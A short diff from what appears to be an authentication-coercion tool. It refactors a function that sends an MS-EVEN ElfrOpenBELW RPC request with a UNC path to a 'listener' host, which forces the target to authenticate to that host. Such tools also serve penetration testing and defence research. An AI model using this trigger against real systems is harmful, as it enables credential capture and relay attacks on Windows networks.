@@ -30,7 +30,7 @@ def trigger_elfr_open_belw(dce, listener, listener_port=None, **kw):
     try:
         request = even.ElfrOpenBELW()
         request["UNCServerName"] = NULL
-        request["BackupFileName"] = "\\??\\UNC\\%s\\%s\\aa\x00" % (listener, _rnd())
+        request["BackupFileName"] = f"\\??\\UNC\\{listener}\\{_rnd()}\\aa\x00"
         request["MajorVersion"] = 1
         request["MinorVersion"] = 1
         dce.request(request)
